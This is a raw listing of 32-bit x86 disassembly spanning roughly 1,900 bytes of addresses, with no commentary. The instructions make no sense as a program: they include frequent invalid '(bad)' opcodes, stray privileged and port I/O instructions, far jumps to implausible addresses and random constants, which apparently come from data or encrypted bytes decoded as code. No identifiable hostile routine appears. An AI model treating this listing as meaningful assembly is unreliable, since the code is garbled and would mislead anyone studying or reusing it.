  41c10d:	sbb    dl,ch
  41c10f:	cmp    edx,DWORD PTR [ebp+0x128a24c]
  41c115:	dec    ch
  41c117:	mov    esi,0xff25418b
  41c11c:	xchg   di,ax
  41c11e:	push   0xffffff8d
  41c120:	jg     0x41c0f5
  41c122:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c123:	call   0x5f835482
  41c128:	call   0x3bd1:0x7429ecc
  41c12f:	popf   
  41c130:	out    0x43,al
  41c132:	mov    ch,0x94
  41c134:	aam    0xee
  41c136:	ja     0x41c0f3
  41c138:	(bad)  
  41c139:	in     eax,0x4b
  41c13b:	repz mov WORD PTR [ebx+0x25],?
  41c13f:	mov    dh,0x4c
  41c141:	repnz pop ecx
  41c143:	mov    esp,0xbd00e216
  41c148:	adc    edi,eax
  41c14a:	pop    ss
  41c14b:	scas   al,BYTE PTR es:[edi]
  41c14c:	mov    edi,0xea2abb97
  41c151:	xor    edx,DWORD PTR [eax-0x5]
  41c154:	push   eax
  41c155:	and    dh,BYTE PTR [ecx+ecx*8+0x372dcf5c]
  41c15c:	es ins DWORD PTR es:[edi],dx
  41c15e:	dec    esi
  41c15f:	or     dh,BYTE PTR [eax+0x765fbc67]
  41c165:	mov    bl,0xb4
  41c167:	mov    fs,WORD PTR [edx]
  41c169:	ins    DWORD PTR es:[edi],dx
  41c16a:	add    eax,0x7ec3692d
  41c16f:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c171:	jl     0x41c13c
  41c173:	xlat   BYTE PTR ds:[ebx]
  41c174:	mov    edi,DWORD PTR [ebp+0x7a3a707]
  41c17a:	xchg   ebp,eax
  41c17b:	(bad)  
  41c17c:	mov    ch,0xd6
  41c17e:	cmp    dh,BYTE PTR [ebx+0x5e]
  41c181:	push   eax
  41c182:	cmp    eax,0x41ad122d
  41c187:	add    DWORD PTR [eax+0x5d],ebx
  41c18a:	pop    eax
  41c18b:	rcl    esp,cl
  41c18d:	aad    0xd3
  41c18f:	js     0x41c17e
  41c191:	inc    ebx
  41c192:	cmp    ebp,eax
  41c194:	push   ecx
  41c195:	nop
  41c196:	or     eax,0x2fd0435c
  41c19b:	jb     0x41c1a4
  41c19d:	pop    eax
  41c19e:	jb     0x41c1e7
  41c1a0:	and    esp,edi
  41c1a2:	jp     0x41c1f4
  41c1a4:	out    dx,eax
  41c1a5:	mov    al,0xe8
  41c1a7:	cmp    DWORD PTR [edx],0xffffffc7
  41c1aa:	and    DWORD PTR [esi-0x59b9b1a4],ebp
  41c1b0:	push   ebx
  41c1b1:	ret    
  41c1b2:	test   ecx,ecx
  41c1b4:	xchg   ecx,eax
  41c1b5:	jge    0x41c20f
  41c1b7:	pavgw  mm0,QWORD PTR [esi+0x2a59475]
  41c1be:	mov    cl,0x6b
  41c1c0:	push   ss
  41c1c1:	dec    esi
  41c1c2:	add    edi,DWORD PTR [esi+eax*1-0x36]
  41c1c6:	sbb    edx,esi
  41c1c8:	push   cs
  41c1c9:	or     edi,DWORD PTR [ecx+0x381239f0]
  41c1cf:	add    BYTE PTR [edx+edx*4-0x45],0x63
  41c1d4:	retf   0x1e1
  41c1d7:	sub    DWORD PTR [edi-0x259d3c77],0x57
  41c1de:	mov    ds:0xa9a3c3d8,eax
  41c1e3:	icebp  
  41c1e4:	dec    esp
  41c1e5:	sub    BYTE PTR [esi],ah
  41c1e7:	shl    BYTE PTR [edi+0x23],1
  41c1ea:	ret    0x3957
  41c1ed:	jns    0x41c1bf
  41c1ef:	out    dx,eax
  41c1f0:	or     BYTE PTR [ebx+0x16dae6ed],bl
  41c1f6:	jg     0x41c24d
  41c1f8:	xor    eax,0xe884ae1e
  41c1fd:	jmp    0x41c1dc
  41c1ff:	in     eax,dx
  41c200:	mov    dh,0x6a
  41c202:	mov    al,ds:0xe0160a5b
  41c207:	(bad)  
  41c208:	jns    0x41c19c
  41c20a:	add    eax,0xa281faae
  41c20f:	sub    eax,0xaa866544
  41c214:	mov    ebp,DWORD PTR [eax-0x16ffa3e2]
  41c21a:	inc    edi
  41c21b:	inc    esp
  41c21c:	cmp    BYTE PTR [ebx],dh
  41c21e:	loopne 0x41c1d9
  41c220:	push   ecx
  41c221:	in     eax,0x3
  41c223:	mov    bl,BYTE PTR [eax-0x358944b2]
  41c229:	gs jg  0x41c1c9
  41c22c:	xor    al,0xe6
  41c22e:	mov    bl,0xd5
  41c230:	jmp    0x806a5298
  41c235:	std    
  41c236:	jnp    0x41c25d
  41c238:	xchg   esi,eax
  41c239:	xchg   edx,eax
  41c23a:	mul    BYTE PTR [eax-0x29]
  41c23d:	into   
  41c23e:	retf   0x7fa2
  41c241:	inc    esi
  41c242:	or     edx,eax
  41c244:	lds    ebx,FWORD PTR [ecx-0x6ca5ce1a]
  41c24a:	(bad)  
  41c24b:	sti    
  41c24c:	mov    ds:0x329b7b8f,al
  41c251:	fdivr  st,st(2)
  41c253:	jmp    0xf4bf0a28
  41c258:	xchg   edx,eax
  41c259:	and    DWORD PTR [edx],edi
  41c25b:	(bad)
  41c25f:	xor    bh,BYTE PTR [eax]
  41c261:	xchg   DWORD PTR [edx],ebp
  41c263:	xor    ebx,DWORD PTR [edx+0x4bb37733]
  41c269:	sub    BYTE PTR [edx+0x49],0xff
  41c26d:	dec    esp
  41c26e:	mov    fs,WORD PTR [edi+0x100c0211]
  41c274:	fstp   QWORD PTR [ebx-0x72]
  41c277:	bound  esi,QWORD PTR [edx]
  41c279:	lahf   
  41c27a:	dec    eax
  41c27b:	mov    eax,ds:0x4cad9f70
  41c280:	push   0x22
  41c282:	je     0x41c28f
  41c284:	out    0xd6,eax
  41c286:	addr16 pop ds
  41c288:	fwait
  41c289:	adc    al,0xde
  41c28b:	inc    esi
  41c28c:	cld    
  41c28d:	jmp    0x8604:0x8efaa825
  41c294:	mov    esp,0x8599adb9
  41c299:	pop    ecx
  41c29a:	int3   
  41c29b:	jno    0x41c263
  41c29d:	mov    ecx,0x57fb83ed
  41c2a2:	mov    BYTE PTR [edx-0x44ddff28],al
  41c2a8:	rcl    esp,cl
  41c2aa:	dec    edi
  41c2ab:	jno    0x41c328
  41c2ad:	jnp    0x41c260
  41c2af:	xchg   BYTE PTR [ecx+0x2ddc9eb],dh
  41c2b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c2b6:	add    al,0x6c
  41c2b8:	push   ecx
  41c2b9:	or     ch,BYTE PTR ds:0xbce1a184
  41c2bf:	mov    al,0x66
  41c2c1:	sub    DWORD PTR [ebx+ebx*8+0x5bde9e5f],eax
  41c2c8:	adc    eax,0x7e58fd77
  41c2cd:	xchg   esp,eax
  41c2ce:	aad    0x35
  41c2d0:	dec    ebp
  41c2d1:	mov    bh,0x1b
  41c2d3:	out    0x35,eax
  41c2d5:	inc    eax
  41c2d6:	loopne 0x41c2dd
  41c2d8:	sbb    eax,0xb0bdda89
  41c2dd:	sub    bh,ch
  41c2df:	(bad)  
  41c2e0:	jecxz  0x41c2c5
  41c2e2:	push   esi
  41c2e3:	fidiv  DWORD PTR [ecx+0x4d]
  41c2e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c2e7:	mov    esp,0x5fa25905
  41c2ec:	iret   
  41c2ed:	dec    esi
  41c2ee:	mov    ds:0x174baeac,al
  41c2f3:	sbb    cl,ah
  41c2f5:	add    ecx,DWORD PTR [edx]
  41c2f7:	rcl    DWORD PTR [esi+ebp*4],cl
  41c2fa:	xchg   ebp,eax
  41c2fb:	int    0x93
  41c2fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2fe:	inc    edi
  41c2ff:	sub    cl,dh
  41c301:	retf   0x5bcd
  41c304:	pop    ss
  41c305:	popa   
  41c306:	leave  
  41c307:	mov    ch,0x38
  41c309:	xchg   esp,eax
  41c30a:	sar    DWORD PTR [eax-0x4f],1
  41c30d:	js     0x41c298
  41c30f:	pop    ss
  41c310:	xchg   edx,eax
  41c311:	js     0x41c2ab
  41c313:	sub    eax,0xaf15dfcd
  41c318:	add    al,0x91
  41c31a:	xchg   BYTE PTR [esp+ecx*4],ch
  41c31d:	arpl   WORD PTR [ecx-0x5b],si
  41c320:	call   0x88a7:0xac6284d7
  41c327:	rcl    DWORD PTR [ebx-0x5231472c],0x83
  41c32e:	xor    BYTE PTR [eax],bh
  41c330:	daa    
  41c331:	jmp    0x41c36e
  41c333:	and    al,0x12
  41c335:	mov    al,0x3f
  41c337:	push   edi
  41c338:	ins    DWORD PTR es:[edi],dx
  41c339:	jmp    0x41c322
  41c33b:	je     0x41c2d1
  41c33d:	xchg   esi,eax
  41c33e:	pop    ecx
  41c33f:	xor    DWORD PTR [esi-0x5b],ecx
  41c342:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c343:	jmp    0x41c329
  41c345:	loopne 0x41c34e
  41c347:	outs   dx,BYTE PTR ds:[esi]
  41c348:	in     al,dx
  41c349:	mov    cl,0x14
  41c34b:	lds    ecx,FWORD PTR [edx]
  41c34d:	cs aad 0xc6
  41c350:	push   cs
  41c351:	mov    BYTE PTR [esi],dh
  41c353:	cwde   
  41c354:	out    0x9f,al
  41c356:	jae    0x41c308
  41c358:	inc    esp
  41c359:	mov    edx,0xe41d0fc6
  41c35e:	adc    al,0xa
  41c360:	fwait
  41c361:	je     0x41c3af
  41c363:	cli    
  41c364:	les    ebp,FWORD PTR ss:[edi]
  41c367:	int    0xf2
  41c369:	stc    
  41c36a:	and    cl,dh
  41c36c:	jmp    0x41c3b9
  41c36e:	out    0x13,al
  41c370:	inc    ebx
  41c371:	stos   DWORD PTR es:[edi],eax
  41c372:	fsubr  DWORD PTR [ebp-0x78680ef5]
  41c378:	aas    
  41c379:	rcl    bl,1
  41c37b:	or     bl,BYTE PTR [edx]
  41c37d:	shr    BYTE PTR [eax],1
  41c37f:	lods   al,BYTE PTR ds:[esi]
  41c380:	fs (bad) 
  41c382:	ss addr16 and ah,ch
  41c386:	ror    BYTE PTR [ecx],0x6f
  41c389:	mov    al,0x75
  41c38c:	scas   eax,DWORD PTR es:[edi]
  41c38d:	stc    
  41c38e:	jno    0x41c350
  41c390:	sbb    ch,BYTE PTR [edi]
  41c392:	push   esp
  41c393:	aas    
  41c394:	mov    edi,0x6c36f075
  41c399:	pop    eax
  41c39b:	mov    ecx,0xab48ffa4
  41c3a0:	sbb    cl,BYTE PTR [esi]
  41c3a2:	adc    eax,0x9e1e6454
  41c3a7:	push   0xffffffb5
  41c3a9:	adc    eax,0xfd894b19
  41c3ae:	mov    dh,0xec
  41c3b0:	fcmovb st,st(4)
  41c3b2:	iret   
  41c3b3:	repnz fs ffree st(3)
  41c3b7:	(bad)  
  41c3b9:	dec    edi
  41c3ba:	cmp    eax,0x9724c34c
  41c3bf:	iret   
  41c3c0:	jecxz  0x41c35d
  41c3c2:	adc    al,0x8f
  41c3c4:	cmp    dh,BYTE PTR [ecx-0x46b49ba4]
  41c3ca:	nop
  41c3cb:	les    esp,FWORD PTR [eax]
  41c3cd:	sbb    DWORD PTR [ecx+esi*1+0x751f5f71],esi
  41c3d4:	pop    ebx
  41c3d5:	fs pop esi
  41c3d7:	mov    bh,0x77
  41c3d9:	ss mov esp,0x3cfb5d57
  41c3df:	retf   
  41c3e0:	adc    dh,dl
  41c3e2:	scas   al,BYTE PTR es:[edi]
  41c3e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c3e4:	push   esi
  41c3e5:	mov    edx,DWORD PTR [edx-0x3f]
  41c3e8:	ins    DWORD PTR es:[edi],dx
  41c3e9:	sbb    eax,DWORD PTR [esi-0x6]
  41c3ec:	leave  
  41c3ed:	jbe    0x41c43a
  41c3ef:	dec    edx
  41c3f0:	mov    bh,BYTE PTR [eiz*8-0x18ca1b43]
  41c3f7:	cmp    ecx,DWORD PTR ds:0x189bcb97
  41c3fd:	out    0x2b,al
  41c3ff:	je     0x41c3ed
  41c401:	fpatan 
  41c403:	cs dec edx
  41c405:	mov    edi,0xf423ae52
  41c40a:	sbb    ch,bl
  41c40c:	push   ecx
  41c40d:	xor    eax,0x651c8917
  41c412:	js     0x41c3e1
  41c414:	ja     0x41c3fc
  41c416:	adc    bl,BYTE PTR [esi]
  41c418:	and    al,0x62
  41c41a:	daa    
  41c41b:	xor    al,0x75
  41c41d:	arpl   WORD PTR [ecx+0x66],sp
  41c420:	dec    eax
  41c421:	jle    0x41c3cf
  41c423:	outs   dx,DWORD PTR ds:[esi]
  41c424:	call   FWORD PTR [edi-0x396df999]
  41c42a:	mov    ah,BYTE PTR [eax+0x7b72d83f]
  41c430:	xor    al,0x9e
  41c432:	mov    edi,0xefc53657
  41c437:	stos   BYTE PTR es:[edi],al
  41c438:	fld    TBYTE PTR [esi+edx*4+0x4fc87e67]
  41c43f:	fdivr  QWORD PTR [ecx+0x21]
  41c442:	push   0xf695c2c7
  41c447:	adc    eax,0xf484d008
  41c44c:	adc    dh,BYTE PTR [ebx]
  41c44e:	fld    DWORD PTR [ecx+eiz*1]
  41c451:	fadd   DWORD PTR [eax-0x68]
  41c454:	je     0x41c4af
  41c456:	adc    esi,DWORD PTR [edi+ebx*4+0x45]
  41c45a:	call   0x9970:0xe587c734
  41c461:	inc    edi
  41c462:	cmp    ebx,eax
  41c464:	xchg   esp,eax
  41c465:	push   ss
  41c466:	sub    eax,0xc2d2614f
  41c46b:	xor    al,0x6f
  41c46d:	out    dx,al
  41c46e:	sbb    al,0xd6
  41c470:	sub    al,0x2f
  41c472:	jl     0x41c449
  41c474:	or     eax,0xfbe8b62b
  41c479:	cmovns esp,DWORD PTR [ebx+esi*2+0x46eb1756]
  41c481:	or     bl,ch
  41c483:	push   edx
  41c484:	out    dx,al
  41c485:	out    dx,eax
  41c486:	cmovns ebx,DWORD PTR ds:0xed86ac7f
  41c48d:	cmp    al,0x96
  41c48f:	xchg   ebx,eax
  41c490:	inc    edx
  41c491:	lea    esp,[edx]
  41c493:	ins    BYTE PTR es:[edi],dx
  41c494:	dec    edx
  41c495:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c496:	not    ebp
  41c498:	inc    esp
  41c499:	mov    cl,bl
  41c49b:	(bad)  
  41c49c:	pop    edi
  41c49d:	or     edx,DWORD PTR [edi+0x60]
  41c4a0:	lods   eax,DWORD PTR ds:[esi]
  41c4a1:	jne    0x41c455
  41c4a3:	pop    eax
  41c4a4:	lock mov esi,0xb7dd3ecc
  41c4aa:	mov    ebp,0xde90e93f
  41c4af:	mov    cl,0x4a
  41c4b1:	ret    0x3124
  41c4b4:	aaa    
  41c4b5:	lock das 
  41c4b7:	pop    edx
  41c4b8:	push   esi
  41c4b9:	xchg   esp,eax
  41c4ba:	lds    esp,FWORD PTR [edx-0x6084be13]
  41c4c0:	or     al,0xcf
  41c4c2:	jae    0x41c4ef
  41c4c4:	adc    BYTE PTR [eax],dh
  41c4c6:	push   cs
  41c4c7:	inc    eax
  41c4c8:	mov    al,0xda
  41c4ca:	or     dl,BYTE PTR [edx-0xb6b7129]
  41c4d0:	mov    DWORD PTR [esi+0x5d5ae624],esi
  41c4d6:	mov    esp,0xf681710b
  41c4db:	cmc    
  41c4dc:	mov    DWORD PTR [ebx+0x601e1a76],eax
  41c4e2:	in     eax,0x5a
  41c4e4:	cmp    bl,BYTE PTR [edx]
  41c4e6:	push   ecx
  41c4e7:	mov    dh,0x2d
  41c4e9:	lea    edx,[edi+0x3b]
  41c4ec:	in     eax,dx
  41c4ed:	shl    DWORD PTR [ecx+0x9],0xa1
  41c4f1:	jns    0x41c4e7
  41c4f3:	aad    0xa5
  41c4f5:	shl    eax,1
  41c4f7:	adc    eax,0x4d3357f
  41c4fc:	xchg   ecx,eax
  41c4fd:	xor    bl,BYTE PTR [ebx]
  41c4ff:	fcmovbe st,st(4)
  41c501:	dec    ebp
  41c502:	(bad)  
  41c503:	shl    BYTE PTR [ebx-0x5b],cl
  41c506:	push   ebp
  41c507:	inc    eax
  41c508:	or     ch,0xc0
  41c50b:	test   ebp,0x141f3ea2
  41c511:	test   eax,0x52ec3df7
  41c516:	xlat   BYTE PTR ds:[ebx]
  41c517:	leave  
  41c518:	xor    al,0x96
  41c51a:	cs sub bl,ah
  41c51d:	mov    dh,0xe7
  41c51f:	lods   eax,DWORD PTR ds:[esi]
  41c520:	lds    esi,FWORD PTR [ecx-0x17]
  41c523:	bound  edx,QWORD PTR [edi+0x7e]
  41c526:	xchg   ebp,eax
  41c527:	daa    
  41c528:	jp     0x41c515
  41c52a:	or     al,ch
  41c52c:	xchg   edi,eax
  41c52d:	sahf   
  41c52e:	push   ebx
  41c52f:	jmp    DWORD PTR [ebx-0x6b245d00]
  41c535:	adc    ebp,DWORD PTR [edx]
  41c537:	mov    edx,0x5e67f816
  41c53c:	es inc edi
  41c53e:	out    0x24,al
  41c540:	aaa    
  41c541:	addr16 das 
  41c543:	xor    eax,0x79a1550f
  41c548:	mov    dh,0x9
  41c54a:	jae    0x41c512
  41c54c:	icebp  
  41c54d:	aad    0x1f
  41c54f:	pop    es
  41c550:	push   edi
  41c551:	inc    eax
  41c552:	jle    0x41c52c
  41c554:	xchg   edi,eax
  41c555:	cmp    DWORD PTR cs:[eax-0xdd1bda7],edx
  41c55c:	cmp    cl,cl
  41c55e:	adc    edi,0x1489ef9e
  41c564:	pop    esi
  41c565:	sahf   
  41c566:	cmp    dh,BYTE PTR [ecx]
  41c568:	out    0x5f,al
  41c56a:	sub    BYTE PTR [esi],al
  41c56c:	xor    al,0xd5
  41c56e:	cmc    
  41c56f:	xor    cl,bh
  41c571:	cmp    al,0xf5
  41c573:	fcomp  DWORD PTR [ecx+eiz*4]
  41c576:	and    eax,0x6f26551a
  41c57b:	pushf  
  41c57c:	imul   eax,DWORD PTR [ecx],0xfd28c3a7
  41c582:	jp     0x41c578
  41c584:	push   cs
  41c585:	fild   DWORD PTR [edi-0x5]
  41c588:	xchg   ecx,eax
  41c589:	jno    0x41c53c
  41c58b:	lods   al,BYTE PTR ds:[esi]
  41c58c:	jle    0x41c5d0
  41c58e:	cmp    al,0x5
  41c590:	mov    ?,WORD PTR [edx+0x45]
  41c593:	pop    esi
  41c594:	lods   eax,DWORD PTR ds:[esi]
  41c595:	call   0x80e4:0x4c9ff8ac
  41c59c:	inc    ecx
  41c59d:	je     0x41c5b5
  41c59f:	jmp    0x41c607
  41c5a1:	mov    eax,0x3aead75a
  41c5a6:	sub    eax,0x60663da9
  41c5ab:	cld    
  41c5ac:	inc    edi
  41c5ad:	test   al,0x59
  41c5af:	popa   
  41c5b0:	popa   
  41c5b1:	imul   esi,DWORD PTR [edx],0x12fe42f1
  41c5b7:	mov    BYTE PTR [eax-0x18692656],cl
  41c5bd:	fcom   st(5)
  41c5bf:	xchg   ebp,eax
  41c5c0:	push   esi
  41c5c1:	add    esp,0xb
  41c5c4:	shl    DWORD PTR [eax+0x470b47dd],0x7c
  41c5cb:	(bad)  
  41c5cc:	out    dx,eax
  41c5cd:	inc    edi
  41c5ce:	jp     0x41c5ee
  41c5d0:	ds (bad) 
  41c5d2:	icebp  
  41c5d3:	add    al,0x91
  41c5d5:	inc    ecx
  41c5d6:	adc    DWORD PTR [eax],0x32
  41c5d9:	inc    ebp
  41c5da:	addr16 inc ecx
  41c5dc:	mov    ebp,0xf91bb732
  41c5e1:	repnz cmp dh,ah
  41c5e4:	sub    edi,DWORD PTR [edi+eax*2+0x3a]
  41c5e8:	inc    edx
  41c5e9:	mov    dl,BYTE PTR [ecx+0x3a95ac2c]
  41c5ef:	scas   al,BYTE PTR es:[edi]
  41c5f0:	ret    0xe91c
  41c5f3:	ss test al,0xd9
  41c5f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c5f7:	xchg   ebx,eax
  41c5f8:	cli    
  41c5f9:	mov    dh,0x64
  41c5fb:	ins    DWORD PTR es:[edi],dx
  41c5fc:	mov    ah,bl
  41c5fe:	push   0x32
  41c600:	fisttp QWORD PTR [ecx+edi*1+0x744dd80a]
  41c607:	adc    BYTE PTR [di],ch
  41c60a:	xchg   DWORD PTR [edx],eax
  41c60c:	imul   edi,DWORD PTR [esi-0x5efd3287],0x5f
  41c613:	cmp    DWORD PTR [eax+0x76],ebp
  41c616:	int    0x41
  41c618:	into   
  41c619:	inc    eax
  41c61a:	sbb    DWORD PTR [esi-0x5353c3ea],0x403e5793
  41c624:	pop    ebp
  41c625:	or     eax,0x4a748cc1
  41c62a:	adc    BYTE PTR [edx],0x59
  41c62d:	add    BYTE PTR cs:[edx+0x3b2c745],dh
  41c634:	cmp    BYTE PTR [ebx],0x56
  41c637:	jge    0x41c65c
  41c639:	xchg   ecx,eax
  41c63a:	dec    eax
  41c63b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c63c:	mov    edx,0xf5b7c088
  41c641:	aad    0x3f
  41c643:	mov    ecx,0xb8c0f1f
  41c648:	or     eax,0xfe732298
  41c64d:	(bad)  
  41c64f:	mov    al,0x96
  41c651:	fild   DWORD PTR [ecx+ebx*4]
  41c654:	xor    BYTE PTR [ebp+0x58],0xa7
  41c658:	mov    ecx,0x44aa6c12
  41c65d:	push   ecx
  41c65e:	mov    cl,0x5a
  41c660:	jge    0x41c666
  41c662:	xor    DWORD PTR [ecx-0x57],0x2c
  41c666:	or     ebx,DWORD PTR [edi]
  41c668:	ret    0x42f2
  41c66b:	sub    eax,edx
  41c66d:	jl     0x41c6b3
  41c66f:	popf   
  41c670:	in     al,dx
  41c671:	lahf   
  41c672:	xchg   ecx,eax
  41c673:	int3   
  41c674:	sub    BYTE PTR [edx+0x560cdbf8],bl
  41c67a:	jge    0x41c6a2
  41c67c:	fs jo  0x41c67b
  41c67f:	nop
  41c680:	cwde   
  41c681:	dec    ebx
  41c682:	or     bh,al
  41c684:	xchg   ebp,eax
  41c685:	inc    esi
  41c686:	pop    edi
  41c687:	xchg   BYTE PTR [esi-0x7521f03c],bh
  41c68d:	mov    ebp,0xa3a3f369
  41c692:	jnp    0x41c6c7
  41c694:	xchg   edi,eax
  41c695:	popf   
  41c696:	jb     0x41c688
  41c698:	and    eax,0xee4b2186
  41c69d:	and    edx,DWORD PTR [ecx]
  41c69f:	test   eax,0xba37de24
  41c6a4:	jae    0x41c69a
  41c6a6:	inc    ebx
  41c6a7:	dec    edx
  41c6a8:	pop    ebp
  41c6a9:	pop    ds
  41c6aa:	mov    cl,0xa
  41c6ac:	arpl   WORD PTR [eax],bp
  41c6ae:	jns    0x41c66e
  41c6b0:	out    dx,eax
  41c6b1:	push   esi
  41c6b2:	push   ebp
  41c6b3:	sub    al,BYTE PTR [ebp+0x38fd716f]
  41c6b9:	aad    0xbd
  41c6bb:	inc    ebx
  41c6bc:	nop
  41c6bd:	mov    al,0x1
  41c6bf:	arpl   WORD PTR [ebx+eax*8],si
  41c6c2:	sub    ebp,DWORD PTR [ecx+0x75]
  41c6c5:	(bad)  [edi-0x7d4d634a]
  41c6cb:	stos   BYTE PTR es:[edi],al
  41c6cc:	test   DWORD PTR [edx+0x616a22f4],ebx
  41c6d2:	sub    dh,BYTE PTR [ebx]
  41c6d4:	inc    edi
  41c6d5:	pop    esi
  41c6d6:	stos   DWORD PTR es:[edi],eax
  41c6d7:	sahf   
  41c6d8:	in     eax,0x56
  41c6da:	call   0x976e7ea5
  41c6df:	out    dx,al
  41c6e0:	mov    ecx,0xd7358463
  41c6e5:	xor    eax,0x73dc2016
  41c6ea:	add    BYTE PTR [edx+0x65c321b6],bl
  41c6f0:	mov    esp,0x211206af
  41c6f5:	clc    
  41c6f6:	test   bl,ch
  41c6f8:	ins    DWORD PTR es:[edi],dx
  41c6f9:	into   
  41c6fa:	pop    eax
  41c6fb:	shl    BYTE PTR [edi+esi*1-0x332aca47],0xd8
  41c703:	dec    edx
  41c704:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c705:	stc    
  41c706:	setl   BYTE PTR [eax-0x35]
  41c70a:	das    
  41c70b:	xchg   esi,eax
  41c70c:	iret   
  41c70d:	dec    DWORD PTR [edi]
  41c70f:	ret    
  41c710:	bound  ebx,QWORD PTR [eax-0x39]
  41c713:	pop    esp
  41c714:	xor    dl,dh
  41c716:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c717:	aad    0x71
  41c719:	aam    0xa
  41c71b:	out    dx,eax
  41c71c:	daa    
  41c71d:	test   bh,0xe2
  41c720:	add    bl,BYTE PTR [ecx+0x53938f7]
  41c726:	xor    DWORD PTR [ecx+0x23fcb541],ebx
  41c72c:	imul   esp,DWORD PTR [esi+0x61322d37],0x71
  41c733:	sub    cl,BYTE PTR cs:[eax+eiz*1+0x5e]
  41c738:	hlt    
  41c739:	jns    0x41c782
  41c73b:	jno    0x41c6ff
  41c73d:	mov    eax,ds:0xf5fc293a
  41c742:	push   edi
  41c743:	mov    dh,0xae
  41c745:	div    BYTE PTR [ebp-0x5d2776e2]
  41c74b:	pop    ebp
  41c74c:	sub    eax,0xe83d13c8
  41c751:	sub    dh,BYTE PTR [esi-0x29c67fb9]
  41c757:	cld    
  41c758:	dec    esp
  41c759:	mov    bl,0x33
  41c75b:	daa    
  41c75c:	jae    0x41c73f
  41c75e:	push   ss
  41c75f:	lock rcr BYTE PTR [ecx-0x62],cl
  41c763:	jmp    0x41c798
  41c765:	mov    edi,0x58bd4faa
  41c76a:	push   ebx
  41c76b:	(bad)  
  41c76c:	push   0xd990d957
  41c771:	sahf   
  41c772:	(bad)  
  41c774:	mov    eax,0xd28e6d99
  41c779:	aam    0x84
  41c77b:	push   esi
  41c77c:	cmp    dl,BYTE PTR [ecx]
  41c77e:	cs push esp
  41c780:	aas    
  41c781:	dec    esi
  41c782:	ret    
  41c783:	push   esp
  41c784:	jp     0x41c7ab
  41c786:	cld    
  41c787:	xor    ecx,0xffffffd7
  41c78a:	xchg   edx,eax
  41c78b:	in     eax,dx
  41c78c:	add    esp,DWORD PTR [edi-0x6b15a0c7]
  41c792:	cmp    bh,dl
  41c794:	pop    eax
  41c795:	cmp    al,0xd5
  41c797:	mov    eax,0x58ee01e5
  41c79c:	jb     0x41c7de
  41c79e:	loopne 0x41c7cb
  41c7a0:	add    al,0x8c
  41c7a2:	and    eax,DWORD PTR [edx+0x3235e62f]
  41c7a8:	popf   
  41c7a9:	(bad)  [esi+ebx*1+0x61]
  41c7ad:	sub    al,0x26
  41c7af:	lods   eax,DWORD PTR ds:[esi]
  41c7b0:	mov    WORD PTR [ebx-0x4634a4ff],?
  41c7b6:	or     al,0x99
  41c7b8:	inc    eax
  41c7b9:	sbb    edi,DWORD PTR [esi+ebp*4+0x1fae2355]
  41c7c0:	std    
  41c7c1:	mov    ecx,ebp
  41c7c3:	push   ebx
  41c7c4:	not    BYTE PTR [edi-0x4e184a9]
  41c7ca:	neg    DWORD PTR [ecx]
  41c7cc:	mov    WORD PTR [ebx+0x701759bf],?
  41c7d2:	fistp  QWORD PTR [ebp-0x18484c68]
  41c7d8:	push   cs
  41c7d9:	dec    edi
  41c7da:	inc    esp
  41c7db:	add    DWORD PTR [ecx-0x7c7ac0c2],esp
  41c7e1:	adc    al,BYTE PTR [ecx]
  41c7e3:	jno    0x41c7ca
  41c7e5:	or     edx,ebp
  41c7e7:	fidiv  DWORD PTR [edi-0x5]
  41c7ea:	aas    
  41c7eb:	pusha  
  41c7ec:	and    ah,BYTE PTR [esi+eiz*2]
  41c7ef:	mov    ebp,DWORD PTR [edi-0x23]
  41c7f2:	and    ebx,ecx
  41c7f4:	push   ds
  41c7f5:	fldln2 
  41c7f7:	(bad)  
  41c7f8:	arpl   WORD PTR [esi+ecx*2+0x1c],dx
  41c7fc:	pop    esi
  41c7fd:	mov    ebx,0xe0181dd7
  41c802:	pop    edx
  41c803:	and    BYTE PTR [ebx-0x29],0x74
  41c807:	js     0x41c7dd
  41c809:	lods   ax,WORD PTR ds:[esi]
  41c80b:	and    dl,dl
  41c80d:	mov    ds:0x2f834f22,al
  41c812:	stos   BYTE PTR es:[edi],al
  41c813:	push   es
  41c814:	pop    ebx
  41c815:	inc    edx
  41c816:	ja     0x41c803
  41c818:	mov    ebp,0xc490c8d4
  41c81d:	and    DWORD PTR [ecx+0x67],0x8bbe6ad2
  41c824:	or     al,0xb
  41c826:	jmp    0x4733:0xe569fdd9
  41c82d:	add    al,0x4a
  41c82f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c830:	dec    ebx
  41c831:	(bad)  
  41c832:	mov    ebp,0x2ec74159
  41c837:	je     0x41c86e
  41c839:	ins    BYTE PTR es:[edi],dx
  41c83a:	xchg   ch,dl
  41c83c:	push   edi
  41c83d:	cli    
  41c83e:	inc    edx
  41c83f:	retf   0xaa0d
  41c842:	jbe    0x41c7f2
  41c844:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c845:	ja     0x41c840
  41c847:	adc    edx,DWORD PTR [esi-0xa397a21]
  41c84d:	cli    
  41c84e:	icebp  
  41c84f:	test   DWORD PTR [ebx],edi
  41c851:	jp     0x41c843
  41c853:	sti    
  41c854:	push   0x4f
  41c856:	pushf  
  41c857:	cmp    BYTE PTR [ebp+0x5d],0x73
  41c85b:	inc    ebp
  41c85c:	dec    edi
  41c85d:	fcmovb st,st(0)
  41c85f:	and    bl,BYTE PTR [ebp-0x1f]
  41c862:	in     eax,0xae
  41c864:	loope  0x41c7ff
  41c866:	jb     0x41c845
  41c868:	sbb    ch,BYTE PTR [esi-0x32f5008e]
  41c86e:	pushf  
  41c86f:	ins    BYTE PTR es:[edi],dx
  41c870:	ret    
  41c871:	jo     0x41c8ed
  41c873:	sbb    ah,ch
  41c875:	sbb    edx,eax
  41c877:	mov    bh,0x5
  41c879:	stos   BYTE PTR es:[edi],al
